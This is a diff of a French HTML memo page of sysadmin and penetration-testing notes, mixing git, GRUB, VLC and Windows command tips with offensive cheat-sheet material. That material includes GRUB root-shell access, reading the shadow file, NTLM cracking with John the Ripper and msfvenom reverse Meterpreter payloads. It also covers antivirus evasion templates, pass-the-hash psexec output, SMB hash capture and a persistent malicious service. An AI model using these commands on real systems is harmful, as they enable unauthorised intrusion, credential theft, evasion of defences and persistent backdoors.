-  Keyboard.print(<span class="st">&quot;?subject=&quot;</span>);
-  Keyboard.print(subject);
-  Keyboard.print(<span class="st">&quot;&amp;body=&quot;</span>);
-  Keyboard.print(content);
-  Keyboard.print(<span class="st">&quot;%0A%0A--%20%0A&quot;</span>);
-  Keyboard.print(sign);
-  Keyboard.println(<span class="st">&quot;&quot;</span>);
-
-  waitAndBlink(<span class="dv">1000</span>, <span class="dv">200</span>);
-  <span class="co">//Send</span>
-  pressKeyWithModifier(MODIFIERKEY_ALT, KEY_V);
-  waitAndBlink(<span class="dv">200</span>, <span class="dv">200</span>);
-}
-
-<span class="dt">void</span> loop()
-{
-  <span class="dt">char</span> *to;
-  delay(<span class="dv">1900</span>);
-
-  <span class="kw">if</span> (!doit)
-  {
-    to = <span class="st">&quot;tata@yopmail.com&quot;</span>;
-  }
-  <span class="kw">else</span>
-  {
-    to = <span class="st">&quot;toto@yopmail.com&quot;</span>;
-  }
-
-  writeMail(to, <span class="st">&quot;Croissants mardi&quot;</span>,
-                <span class="st">&quot;Bonjour,%0A%0AJ&#39;offre%20à%20toute%20l&#39;équipe%20des%20croissants%20et%20des%20pains%20au%20chocolat%20mardi%20matin.&quot;</span>,
-                <span class="st">&quot;Teensy%20by%20Me&quot;</span>);
-
-  digitalWrite(ledPin, HIGH);
-  delay(<span class="dv">500</span>);
-  digitalWrite(ledPin, LOW);
-  delay(<span class="dv">20000</span>);
-
-}</code></pre>
-<h1 id="tools"><a href="#TOC">Tools</a></h1>
-<h2 id="git"><a href="#TOC">GIT</a></h2>
-<h3 id="ressources"><a href="#TOC">Ressources</a></h3>
-<h4 id="fichier-de-configuration-.gitconfig"><a href="#TOC">Fichier de configuration .gitconfig</a></h4>
+<h1 id="tools"><a href="#tools">Tools</a></h1>
+<h2 id="git"><a href="#git">GIT</a></h2>
+<h3 id="ressources"><a href="#ressources">Ressources</a></h3>
+<h4 id="fichier-de-configuration-.gitconfig"><a href="#fichier-de-configuration-.gitconfig">Fichier de configuration .gitconfig</a></h4>
 <p>Ce fichier permet de paramétrer git, notamment pour préciser les variables d’environnement et les alias de commandes. Voir <a href="../ressources/Tools/GIT/.gitconfig">l’exemple</a>.</p>
-<h4 id="fichier-de-configuration-.gitignore"><a href="#TOC">Fichier de configuration .gitignore</a></h4>
+<h4 id="fichier-de-configuration-.gitignore"><a href="#fichier-de-configuration-.gitignore">Fichier de configuration .gitignore</a></h4>
 <p>Ce fichier permet de préciser les fichiers qui doivent être ignorés par Git. Pour ce faire, il doit être mentionné dans le .gitconfig comme suit :</p>
 <pre><code>[core]
     excludesfile = /home/&lt;username&gt;/.gitignore</code></pre>
@@ -619,7 +187,7 @@ _inst*
 *.o
 *~
 Thumbs.db</code></pre>
-<h4 id="script-dajout-didentité"><a href="#TOC">Script d’ajout d’identité</a></h4>
+<h4 id="script-dajout-didentité"><a href="#script-dajout-didentité">Script d’ajout d’identité</a></h4>
 <p>Ce script a pour but de ne plus avoir à saisir le mot de passe de sa clé privé à chaque connexion. /!\ L’utilisation de ce script nuit à votre sécurité.</p>
 <p>Voici le fichier :</p>
 <pre><code>var=`ssh-agent -s`
@@ -628,59 +196,58 @@ ssh-add ~/.ssh/id_dsa ~/.ssh/id_rsa
 unset var</code></pre>
 <p>Pour l’utiliser, il faut le sourcer comme suit ou l’intégrer à votre .bashrc :</p>
 <pre><code>. ~/.ssh-add-identity</code></pre>
-<h3 id="useful-commands"><a href="#TOC">Useful commands</a></h3>
-<h4 id="change-log-information"><a href="#TOC">Change log information</a></h4>
+<h3 id="useful-commands"><a href="#useful-commands">Useful commands</a></h3>
+<h4 id="change-log-information"><a href="#change-log-information">Change log information</a></h4>
 <pre><code>git filter-branch -f --env-filter &quot;GIT_AUTHOR_NAME=&#39;Newname&#39;; GIT_AUTHOR_EMAIL=&#39;newemail&#39;; GIT_COMMITTER_NAME=&#39;Newname&#39;; GIT_COMMITTER_EMAIL=&#39;newemail&#39;;&quot; HEAD</code></pre>
-<h4 id="récupérer-les-modifications-présentes-sur-le-serveur"><a href="#TOC">Récupérer les modifications présentes sur le serveur</a></h4>
+<h4 id="récupérer-les-modifications-présentes-sur-le-serveur"><a href="#récupérer-les-modifications-présentes-sur-le-serveur">Récupérer les modifications présentes sur le serveur</a></h4>
 <pre><code>git fetch
 git rebase origin/&lt;Nom de la branche par rapport à qui se mettre à jour&gt;
 #exemple :
 git rebase origin/master</code></pre>
-<h4 id="mettre-à-jour-le-dépôt-local-par-rapport-au-dépôt-distant"><a href="#TOC">Mettre à jour le dépôt local par rapport au dépôt distant</a></h4>
+<h4 id="mettre-à-jour-le-dépôt-local-par-rapport-au-dépôt-distant"><a href="#mettre-à-jour-le-dépôt-local-par-rapport-au-dépôt-distant">Mettre à jour le dépôt local par rapport au dépôt distant</a></h4>
 <pre><code>git fra</code></pre>
-<h4 id="faire-un-commit-local"><a href="#TOC">Faire un commit local</a></h4>
+<h4 id="faire-un-commit-local"><a href="#faire-un-commit-local">Faire un commit local</a></h4>
 <pre><code>git status  # voir le status des fichiers
 git add &lt;Nouveaux fichiers&gt;
 git commit -m &#39;&lt;Message de commit&gt;&#39;</code></pre>
-<h4 id="pousser-les-modifications-sur-le-serveur"><a href="#TOC">Pousser les modifications sur le serveur</a></h4>
+<h4 id="pousser-les-modifications-sur-le-serveur"><a href="#pousser-les-modifications-sur-le-serveur">Pousser les modifications sur le serveur</a></h4>
 <pre><code>git push</code></pre>
-<h4 id="créer-une-branche-sur-un-serveur-remote"><a href="#TOC">Créer une branche sur un serveur (remote)</a></h4>
+<h4 id="créer-une-branche-sur-un-serveur-remote"><a href="#créer-une-branche-sur-un-serveur-remote">Créer une branche sur un serveur (remote)</a></h4>
 <pre><code> git push origin master:refs/heads/testing
  git cob testing          
  echo chiche_branch &gt; test
  git ci -a -m &#39;Chiche test&#39;
- git push                              # Attention, push toutes les branches où des commits ont été faits
-                                             # Préférez donc cette version du push:
- git push origin testing    # Vous précisez la branche testing à pusher dans origin (le serveur)</code></pre>
+ git push origin testing</code></pre>
 <p>ou bien</p>
-<pre><code>git push origin master:refs/heads/testing     # will create the branch staging in the origin repository by copying the local master branch</code></pre>
-<h4 id="merger-2-branches"><a href="#TOC">Merger 2 branches</a></h4>
+<p>will create the branch staging in the origin repository by copying the local master branch</p>
+<pre><code>git push origin master:refs/heads/testing</code></pre>
+<h4 id="merger-2-branches"><a href="#merger-2-branches">Merger 2 branches</a></h4>
 <pre><code>git br crazy_idea
 git br
     experimental
     crazy_idea
   * master
 git co crazy_idea
-git merge experimental       # merge experimental dans crazy_idea
-                             # Si il ya des conflits =&gt; git diff et git status montreront les problemes
- git commit -a               # commit all changes</code></pre>
-<h4 id="supprimer-une-branche-locale"><a href="#TOC">Supprimer une branche locale</a></h4>
-<pre><code> git branch -d experimental          #Cette commande s&#39;assure que les changement de la branche &#39;experimental&#39; 
-                                     #  se trouve dans la branche courante.
- git branch -D crazy_idea            # Si vous développez une idée folle, puis le regrettez, vous pouvez 
-                                     #  toujours effacer cette branche avec -D</code></pre>
-<h4 id="delete-a-remote-branch"><a href="#TOC">Delete a Remote Branch</a></h4>
-<pre><code>git push origin :testing                      #will delete the branch staging from the origin repository.</code></pre>
-<h2 id="grub-configuration"><a href="#TOC">GRUB (configuration)</a></h2>
-<h3 id="modification-de-la-taille-du-terminal"><a href="#TOC">Modification de la taille du terminal</a></h3>
+# merge experimental dans crazy_idea
+git merge experimental
+git commit -a</code></pre>
+<h4 id="supprimer-une-branche-locale"><a href="#supprimer-une-branche-locale">Supprimer une branche locale</a></h4>
+<p>Cette commande s’assure que les changement de la branche ‘experimental’ se trouve dans la branche courante.</p>
+<pre><code>git branch -d experimental</code></pre>
+<p>Si vous développez une idée folle, puis le regrettez, vous pouvez toujours effacer cette branche avec -D</p>
+<pre><code>git branch -D crazy_idea</code></pre>
+<h4 id="delete-a-remote-branch"><a href="#delete-a-remote-branch">Delete a Remote Branch</a></h4>
+<p>will delete the branch staging from the origin repository.</p>
+<pre><code>git push origin :testing</code></pre>
+<h2 id="grub"><a href="#grub">GRUB</a></h2>
+<h3 id="configuration---modification-de-la-taille-du-terminal"><a href="#configuration---modification-de-la-taille-du-terminal">Configuration - Modification de la taille du terminal</a></h3>
 <p>Pour Grub2, il suffit de : * Surcharger la valeur de GRUB_GFXMODE dans /etc/default/grub ; * Surcharger la valeur de GRUB_GFXPAYLOAD_LINUX dans /etc/default/grub ; * Mettre à jour grub ; * Redémarrer.</p>
 <p>Soit, en root :</p>
 <pre><code>echo GRUB_GFXMODE=1024x768      &gt;&gt; /etc/default/grub
 echo GRUB_GFXPAYLOAD_LINUX=keep &gt;&gt; /etc/default/grub
 update-grub
 reboot</code></pre>
-<h2 id="grub-exploitation"><a href="#TOC">GRUB (exploitation)</a></h2>
-<h3 id="affichage-du-fichier-shadow"><a href="#TOC">Affichage du fichier shadow</a></h3>
+<h3 id="affichage-du-fichier-shadow"><a href="#affichage-du-fichier-shadow">Affichage du fichier shadow</a></h3>
 <p>Il faut tout d’abord accéder au shell de GRUB. Pour ce faire, il suffit de presser la touche <strong>c</strong> quand le menu de sélection de grub s’affiche :</p>
 <div class="figure">
 <img src="../ressources/Tools/GRUB/grub-menu.png" title="Grub menu" alt="Menu" /><p class="caption">Menu</p>
@@ -695,12 +262,12 @@ reboot</code></pre>
 </div>
 <p>Une fois le fichier trouvé, il ne reste plus qu’à afficher le fichier avec la commande <strong>cat</strong> :</p>
 <div class="figure">
-<img src="../ressources/Tools/GRUB/grub-shell-cat1.png" title="Grub command line : cat" /><p class="caption"></p>
+<img src="../ressources/Tools/GRUB/grub-shell-cat1.png" title="Grub command line : cat" />
 </div>
 <div class="figure">
-<img src="../ressources/Tools/GRUB/grub-shell-cat2.png" title="Grub command line : cat" /><p class="caption"></p>
+<img src="../ressources/Tools/GRUB/grub-shell-cat2.png" title="Grub command line : cat" />
 </div>
-<h3 id="récupération-dun-shell-root"><a href="#TOC">Récupération d’un shell root</a></h3>
+<h3 id="récupération-dun-shell-root"><a href="#récupération-dun-shell-root">Récupération d’un shell root</a></h3>
 <p>Il faut tout d’abord accéder à la modification du boot. Pour ce faire, il suffit de <strong>sélectionner le système cible</strong>, puis de presser la touche <strong>e</strong> :</p>
 <div class="figure">
 <img src="../ressources/Tools/GRUB/grub-edit.png" title="Grub boot edit" alt="Mode édition" /><p class="caption">Mode édition</p>
@@ -711,21 +278,21 @@ reboot</code></pre>
 <div class="figure">
 <img src="../ressources/Tools/GRUB/grub-modified-init.png" title="Linux root shell" alt="Shell root" /><p class="caption">Shell root</p>
 </div>
-<h2 id="image-magick"><a href="#TOC">Image Magick</a></h2>
-<h3 id="créer-une-image"><a href="#TOC">Créer une image</a></h3>
+<h2 id="image-magick"><a href="#image-magick">Image Magick</a></h2>
+<h3 id="créer-une-image"><a href="#créer-une-image">Créer une image</a></h3>
 <p>La ligne de commande suivante créer une image blanche de 100 pixels par 100 pixels :</p>
 <pre><code>convert -size 100x100 xc:white canvas.jp</code></pre>
-<h3 id="write-text-on-an-image"><a href="#TOC">Write text on an image</a></h3>
+<h3 id="write-text-on-an-image"><a href="#write-text-on-an-image">Write text on an image</a></h3>
 <p>La ligne de commande suivante ecrit en taille 26 “My Caption” en jaune sur l’image orig.jpg aux coordonnées (200, 200) et enregistre le résultat dans dest.jpg.</p>
 <pre><code>convert -pointsize 26 -fill yellow -draw &#39;text 200,200 &quot;My Caption&quot; &#39; orig.jpg dest.jpg</code></pre>
 <p>Pour aller plus loin, il est possible d’ajouter l’argument “-font Helvetica” pour sélectionner la police.</p>
-<h2 id="john-the-ripper"><a href="#TOC">John the ripper</a></h2>
-<h3 id="hash-lm-vers-hash-ntlm"><a href="#TOC">Hash LM vers Hash NTLM</a></h3>
+<h2 id="john-the-ripper"><a href="#john-the-ripper">John the ripper</a></h2>
+<h3 id="hash-lm-vers-hash-ntlm"><a href="#hash-lm-vers-hash-ntlm">Hash LM vers Hash NTLM</a></h3>
 <p>Une fois les hashs LM découvert, il est souvent utiles de casser les hashs NTLM afin d’otenir le mot de passe à la casse prêt.</p>
-<pre class="sourceCode bash"><code class="sourceCode bash">john --rules=NT --wordlist=lmcracked.txt --format=nt hashdump.txt</code></pre>
-<h2 id="metasploit"><a href="#TOC">Metasploit</a></h2>
-<h3 id="genération-de-payload-exécutables"><a href="#TOC">Genération de payload exécutables</a></h3>
-<h4 id="manuel"><a href="#TOC">Manuel</a></h4>
+<pre class="sourceCode bash"><code class="sourceCode bash"><span class="kw">john</span> --rules=NT --wordlist=lmcracked.txt --format=nt hashdump.txt</code></pre>
+<h2 id="metasploit"><a href="#metasploit">Metasploit</a></h2>
+<h3 id="genération-de-payload-exécutables"><a href="#genération-de-payload-exécutables">Genération de payload exécutables</a></h3>
+<h4 id="manuel"><a href="#manuel">Manuel</a></h4>
 <pre><code># msfvenom -h
 Usage: /opt/framework/msf3/msfvenom [options] 
 
@@ -744,18 +311,18 @@ Options:
     -x, --template   [path]          Specify a custom executable file to use as a template
     -k, --keep                       Preserve the template behavior and inject the payload as a new thread
     -h, --help                       Show this message</code></pre>
-<h4 id="exemple"><a href="#TOC">Exemple</a></h4>
-<h5 id="lister-les-options-dun-payload"><a href="#TOC">Lister les options d’un payload</a></h5>
+<h4 id="exemple"><a href="#exemple">Exemple</a></h4>
+<h5 id="lister-les-options-dun-payload"><a href="#lister-les-options-dun-payload">Lister les options d’un payload</a></h5>
 <pre><code># msfvenom -p windows/meterpreter/reverse_tcp -o</code></pre>
-<h5 id="créer-un-payload-meterpreter-pour-windows"><a href="#TOC">Créer un payload meterpreter pour windows</a></h5>
+<h5 id="créer-un-payload-meterpreter-pour-windows"><a href="#créer-un-payload-meterpreter-pour-windows">Créer un payload meterpreter pour windows</a></h5>
 <pre><code># msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 &gt; windobReverseMeterpreter5555.exe</code></pre>
-<h5 id="créer-un-payload-meterpreter-pour-linux"><a href="#TOC">Créer un payload meterpreter pour Linux</a></h5>
+<h5 id="créer-un-payload-meterpreter-pour-linux"><a href="#créer-un-payload-meterpreter-pour-linux">Créer un payload meterpreter pour Linux</a></h5>
 <pre><code># msfvenom -p linux/x86/meterpreter/bind_tcp -f elf LPORT=5555 &gt; linuxMeterpreter5555.bin</code></pre>
-<h4 id="alternative"><a href="#TOC">Alternative</a></h4>
+<h4 id="alternative"><a href="#alternative">Alternative</a></h4>
 <pre><code># msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X &gt; met-reverse.exe</code></pre>
-<h3 id="lancement-de-handler"><a href="#TOC">Lancement de handler</a></h3>
+<h3 id="lancement-de-handler"><a href="#lancement-de-handler">Lancement de handler</a></h3>
 <pre><code># msfcli multi/handler LPORT=5555 E</code></pre>
-<h3 id="exploitation-depuis-msfconsole"><a href="#TOC">Exploitation depuis msfconsole</a></h3>
+<h3 id="exploitation-depuis-msfconsole"><a href="#exploitation-depuis-msfconsole">Exploitation depuis msfconsole</a></h3>
 <p>Cette méthode evite de charger deux fois le gros de metasploit.</p>
 <pre><code>use payload/windows/meterpreter/bind_tcp
 set LPORT 8888
@@ -768,11 +335,11 @@ set PAYLOAD windows/meterpreter/bind_tcp
 set RHOST 192.168.0.1
 set LPORT 8888
 exploit</code></pre>
-<h3 id="contournement-des-antivirus"><a href="#TOC">Contournement des antivirus</a></h3>
+<h3 id="contournement-des-antivirus"><a href="#contournement-des-antivirus">Contournement des antivirus</a></h3>
 <p>Certains virus utilisent des sandboxes pour lancer les exécutables et vérifier leur dangerosité. (Mal)heureusement, ces sandboxes implémentent rarement les communication réseaux, pour des raisons de sécurités.</p>
 <p>Il est donc possible de cacher un payload malveillant en vérifiant la possibilité d’effectuer une connexion réseau. En utilisant le template <a href="../ressources/Tools/metasploit/meterpreterTemplate1.zip">ci-joint</a> et l’encoder metasploit <a href="../ressources/Tools/metasploit/xorbyte.rb">ci-joint</a> à placer dans modules/encoders/x86/xorbyte.rb.</p>
 <p>Pour une backdoor plus permanente, en bind tcp, il est possible d’utiliser le template <a href="../ressources/Tools/metasploit/meterpreterTemplate2.zip">ci-joint</a>.</p>
-<h3 id="passthehash-en-utilisant-metasploit"><a href="#TOC">PassTheHash en utilisant metasploit</a></h3>
+<h3 id="passthehash-en-utilisant-metasploit"><a href="#passthehash-en-utilisant-metasploit">PassTheHash en utilisant metasploit</a></h3>
 <p>Le module <em>exploit/windows/smb/psexec</em> permet de réaliser de s’authentifier sur une machine Windows en PassTheHash et d’obtenir un shell meterpreter :</p>
 <pre><code># msfconsole -q
 msf &gt; use exploit/windows/smb/psexec
@@ -819,8 +386,8 @@ msf  exploit(psexec) &gt; sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter &gt;</code></pre>
-<h3 id="récupération-de-mots-de-passe"><a href="#TOC">Récupération de mots de passe</a></h3>
-<h4 id="exploitation-de-mauvaise-configuration-de-client-samba"><a href="#TOC">Exploitation de mauvaise configuration de client samba</a></h4>
+<h3 id="récupération-de-mots-de-passe"><a href="#récupération-de-mots-de-passe">Récupération de mots de passe</a></h3>
+<h4 id="exploitation-de-mauvaise-configuration-de-client-samba"><a href="#exploitation-de-mauvaise-configuration-de-client-samba">Exploitation de mauvaise configuration de client samba</a></h4>
 <p>Le module <em>auxiliary/server/capture/smb</em> permet de simuler un serveur samba avec un niveau de sécurité faible afin de capturer les hashs des utilisateurs :</p>
 <pre><code># msfconsole -q
 msf  &gt; use auxiliary/server/capture/smb
@@ -885,24 +452,24 @@ NTHASH:d4acfffffffffffffffffffffffffffffffffffffff88736
 msf  auxiliary(smb) &gt;
 
 testuser::FR:175c0e51065adfffffffffffffffffffffffffff78d268aa:175c0e51065adffffffffffffffffffffffff44078d268aa:1122334455667788</code></pre>
-<h2 id="vlc"><a href="#TOC">VLC</a></h2>
-<h3 id="transcoding"><a href="#TOC">Transcoding</a></h3>
-<h4 id="vers-mp4"><a href="#TOC">vers MP4</a></h4>
+<h2 id="vlc"><a href="#vlc">VLC</a></h2>
+<h3 id="transcoding"><a href="#transcoding">Transcoding</a></h3>
+<h4 id="vers-mp4"><a href="#vers-mp4">vers MP4</a></h4>
 <pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mpga,ab=192,scale=1,channels=2}:standard{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; 
 &quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp :sout=&quot;#transcode{vcodec=mp4v,vb=1800,fps=25 acodec=mp4a}:std{access=file,mux=mp4,dst=&#39;output.mp4&#39;}&quot; </code></pre>
-<h4 id="vers-avi"><a href="#TOC">vers AVI</a></h4>
+<h4 id="vers-avi"><a href="#vers-avi">vers AVI</a></h4>
 <pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp:sout=&quot;#transcode{vcodec=div3,vb=4000,fps=25,acodec=mp3,ab=192,channels=2,samplerate=48000,audio-sync,deinterlace,scale=1}:std{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; </code></pre>
-<h3 id="options-utiles"><a href="#TOC">Options utiles</a></h3>
+<h3 id="options-utiles"><a href="#options-utiles">Options utiles</a></h3>
 <pre><code>--audio, --no-audio Activer l&#39;audio (activé par défaut)
 --start-time &lt;second&gt; Démarre la vidéo à un temps donné
 --stop-time &lt;second&gt; Arrêtes la vidéo à un temps donné
 -I dummy N&#39;ouvre pas l&#39;interface graphique
 vlc://quit A mettre en fin de ligne pour fermer vlc</code></pre>
-<h3 id="net-casting-http"><a href="#TOC">Net casting http</a></h3>
+<h3 id="net-casting-http"><a href="#net-casting-http">Net casting http</a></h3>
 <pre><code>vlc -I dummy v4l2:///dev/video0 --no-audio --sout &#39;#transcode{vcodec=mp4v,acodec=mpga,vb=900,ab=128}:std{access=http,mux=ogg,dst=192.168.0.227:8080}&#39;
 
 vlc http://ip:port</code></pre>
-<h3 id="devices"><a href="#TOC">Devices</a></h3>
+<h3 id="devices"><a href="#devices">Devices</a></h3>
 <pre><code>Stream MRL syntax:
   [[access][/demux]://]URL[#[title][:chapter][-[title][:chapter]]]
   [:option=value ...]
@@ -926,41 +493,54 @@ URL syntax:
 
 v4l2:///dev/video0
 cdrom://</code></pre>
-<h1 id="windows-1"><a href="#TOC">Windows</a></h1>
-<h2 id="configuration-de-windows-en-ligne-de-commande"><a href="#TOC">Configuration de windows en ligne de commande</a></h2>
-<h3 id="configuration-de-internet-explorer-en-ligne-de-commande"><a href="#TOC">Configuration de Internet Explorer en ligne de commande</a></h3>
-<h4 id="modifier-le-proxy-utilisé"><a href="#TOC">Modifier le proxy utilisé</a></h4>
+<h2 id="vmware"><a href="#vmware">VMWare</a></h2>
+<h3 id="installer-une-vm-debian-7-avec-les-vmware-tools"><a href="#installer-une-vm-debian-7-avec-les-vmware-tools">Installer une VM debian 7 avec les VMWare tools</a></h3>
+<p>Installation de mes paquets préférés :</p>
+<pre><code>apt-get update
+apt-get upgrade
+apt-get install xorg awesome awesome-extra build-essential
+apt-get install open-vm-tools open-vm-toolbox</code></pre>
+<p>Création du fichier .xinitrc :</p>
+<pre><code>cat &gt; .xinitrc &lt;&lt;EOF
+xrandr -s 1024x600
+vmware-user-suid-wrapper
+awesome
+EOF</code></pre>
+<h1 id="windows"><a href="#windows">Windows</a></h1>
+<h2 id="configuration-de-windows-en-ligne-de-commande"><a href="#configuration-de-windows-en-ligne-de-commande">Configuration de windows en ligne de commande</a></h2>
+<h3 id="configuration-de-internet-explorer-en-ligne-de-commande"><a href="#configuration-de-internet-explorer-en-ligne-de-commande">Configuration de Internet Explorer en ligne de commande</a></h3>
+<h4 id="modifier-le-proxy-utilisé"><a href="#modifier-le-proxy-utilisé">Modifier le proxy utilisé</a></h4>
 <pre><code>REM Modifying the proxy server
 Reg Add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer /t REG_SZ /d 999.999.999.999:8080 /f</code></pre>
-<h4 id="activer-le-proxy"><a href="#TOC">Activer le proxy</a></h4>
+<h4 id="activer-le-proxy"><a href="#activer-le-proxy">Activer le proxy</a></h4>
 <pre><code>REM Activation of the proxy server
 Reg Add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyEnable /t REG_DWORD /d 00000001 /f</code></pre>
-<h3 id="configuration-de-la-carte-réseau-en-ligne-de-commande"><a href="#TOC">Configuration de la carte réseau en ligne de commande</a></h3>
-<h4 id="mise-en-place-dune-ip-statique"><a href="#TOC">Mise en place d’une IP statique</a></h4>
+<h3 id="configuration-de-la-carte-réseau-en-ligne-de-commande"><a href="#configuration-de-la-carte-réseau-en-ligne-de-commande">Configuration de la carte réseau en ligne de commande</a></h3>
+<h4 id="mise-en-place-dune-ip-statique"><a href="#mise-en-place-dune-ip-statique">Mise en place d’une IP statique</a></h4>
 <pre><code>REM SPECIFICATION ADRESSE IP
 netsh interface ip set address &quot;Connexion&quot; static XXX.XXX.XXX.XXX 255.255.255.0 XXX.XXX.XXX.XXX 2</code></pre>
-<h4 id="mise-en-place-de-dns"><a href="#TOC">Mise en place de DNS</a></h4>
+<h4 id="mise-en-place-de-dns"><a href="#mise-en-place-de-dns">Mise en place de DNS</a></h4>
 <pre><code>REM SPECIFICATION ADRESSE DNS
 netsh interface ip set dns &quot;Connexion&quot; static XXX.XXX.XXX.XXX primary</code></pre>
 <pre><code>REM SPECIFICATION ADRESSE DNS SECONDAIRE
 netsh interface ip add dns &quot;Connexion&quot; XXX.XXX.XXX.XXX index=2</code></pre>
-<h4 id="mise-en-place-de-wins"><a href="#TOC">Mise en place de WINS</a></h4>
+<h4 id="mise-en-place-de-wins"><a href="#mise-en-place-de-wins">Mise en place de WINS</a></h4>
 <pre><code>REM SPECIFICATION WINS (pas sûr que ce soit nécessaire)
 netsh interface ip set wins &quot;Connexion&quot; XXX.XXX.XXX.XXX</code></pre>
-<h2 id="ligne-de-commande-windows"><a href="#TOC">Ligne de commande Windows</a></h2>
-<h3 id="gestion-des-utilisateurs"><a href="#TOC">Gestion des utilisateurs</a></h3>
-<h4 id="activation-dun-utilisateur"><a href="#TOC">activation d’un utilisateur</a></h4>
+<h2 id="ligne-de-commande-windows"><a href="#ligne-de-commande-windows">Ligne de commande Windows</a></h2>
+<h3 id="gestion-des-utilisateurs"><a href="#gestion-des-utilisateurs">Gestion des utilisateurs</a></h3>
+<h4 id="activation-dun-utilisateur"><a href="#activation-dun-utilisateur">activation d’un utilisateur</a></h4>
 <pre><code>net users sysadmin /active:yes</code></pre>
-<h4 id="désactivation-dun-utilisateur"><a href="#TOC">désactivation d’un utilisateur</a></h4>
+<h4 id="désactivation-dun-utilisateur"><a href="#désactivation-dun-utilisateur">Désactivation d’un utilisateur</a></h4>
 <pre><code>net users sysadmin /active:no</code></pre>
-<h3 id="gestion-des-services"><a href="#TOC">Gestion des services</a></h3>
+<h3 id="gestion-des-services"><a href="#gestion-des-services">Gestion des services</a></h3>
 <pre><code>sc create Powned binPath= &quot;C:\Meterpreter.exe&quot;
 sc config Powned start= auto
 net start Powned
 sc delete Powned</code></pre>
-<h3 id="gestion-des-fichiers"><a href="#TOC">Gestion des fichiers</a></h3>
+<h3 id="gestion-des-fichiers"><a href="#gestion-des-fichiers">Gestion des fichiers</a></h3>
 <pre><code>xcopy Meterpreter.exe c:\</code></pre>
-<h3 id="commandes-utiles"><a href="#TOC">Commandes utiles</a></h3>
+<h3 id="commandes-utiles"><a href="#commandes-utiles">Commandes utiles</a></h3>
 <table>
 <col width="20%" />
 <col width="61%" />
@@ -972,25 +552,59 @@ sc delete Powned</code></pre>
 </thead>
 <tbody>
 <tr class="odd">
-<td align="left">regedit</td>
-<td align="left">Ouvre l’éditeur de registre</td>
+<td align="left"><p>regedit</p></td>
+<td align="left"><p>Ouvre l’éditeur de registre</p></td>
 </tr>
 <tr class="even">
-<td align="left">services.msc</td>
-<td align="left">Ouvre le gestionnaire de services</td>
+<td align="left"><p>services.msc</p></td>
+<td align="left"><p>Ouvre le gestionnaire de services</p></td>
 </tr>
 <tr class="odd">
-<td align="left">secpol.msc</td>
-<td align="left">Ouvre les paramètres de sécurités locales</td>
+<td align="left"><p>secpol.msc</p></td>
+<td align="left"><p>Ouvre les paramètres de sécurités locales</p></td>
 </tr>
 <tr class="even">
-<td align="left">inetcpl.cpl</td>
-<td align="left">Editeur d’option internet</td>
+<td align="left"><p>inetcpl.cpl</p></td>
+<td align="left"><p>Editeur d’option internet</p></td>
 </tr>
 </tbody>
 </table>
-<h3 id="téléchargement-dun-fichier"><a href="#TOC">Téléchargement d’un fichier</a></h3>
+<h3 id="téléchargement-dun-fichier"><a href="#téléchargement-dun-fichier">Téléchargement d’un fichier</a></h3>
 <pre><code>bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip</code></pre>
+<h3 id="récupération-de-la-clé-de-license"><a href="#récupération-de-la-clé-de-license">Récupération de la clé de license</a></h3>
+<pre class="sourceCode Monobasic"><code class="sourceCode monobasic"><span class="kw">Set </span>WshShell = CreateObject(<span class="st">&quot;WScript.Shell&quot;</span>)
+key          = <span class="st">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</span>\&quot;
+ProductName  = <span class="st">&quot;Product Name : &quot;</span> &amp; WshShell.RegRead(key &amp; <span class="st">&quot;ProductName&quot;</span>) &amp; vbNewLine
+ProductId    = <span class="st">&quot;Product Id : &quot;</span>   &amp; WshShell.RegRead(key &amp; <span class="st">&quot;ProductId&quot;</span>)   &amp; vbNewLine
+ProductKey   = <span class="st">&quot;Install Key : &quot;</span>  &amp; Converted(WshShell.RegRead(key &amp; <span class="st">&quot;DigitalProductId&quot;</span>))
+
+WScript.echo ProductName &amp; ProductId &amp; ProductKey
+
+<span class="kw">Function </span>Converted(id)
+    <span class="kw">Const</span> OFFSET = 52
+    i = 28
+    Chars = <span class="st">&quot;BCDFGHJKMPQRTVWXY2346789&quot;</span>
+
+    <span class="kw">Do</span>
+        Cur = 0
+        x = 14
+        <span class="kw">Do</span>
+            Cur = Cur * 256
+            Cur = id(x + OFFSET) + Cur
+            id(x + OFFSET) = (Cur \ 24) <span class="kw">And</span> 255
+            Cur = Cur Mod 24
+            x = x -1
+        <span class="kw">Loop While </span>x &gt;= 0
+
+        i = i - 1
+        Converted = Mid(Chars, Cur + 1, 1) &amp; Converted
+
+        <span class="kw">If </span>(((29 - i) Mod 6) = 0) <span class="kw">And</span> (i &lt;&gt; -1) <span class="kw">Then</span>
+            i = i -1
+            Converted = <span class="st">&quot;-&quot;</span> &amp; Converted
+        <span class="kw">End If</span>
+    <span class="kw">Loop While </span>i &gt;= 0
+<span class="kw">End Function</span></code></pre>
 <div id="footer">
   &copy; 2012 <a href="http://https://github.com/phil2600/tech-scribe/">Tech-Scribe</a>
 </div>
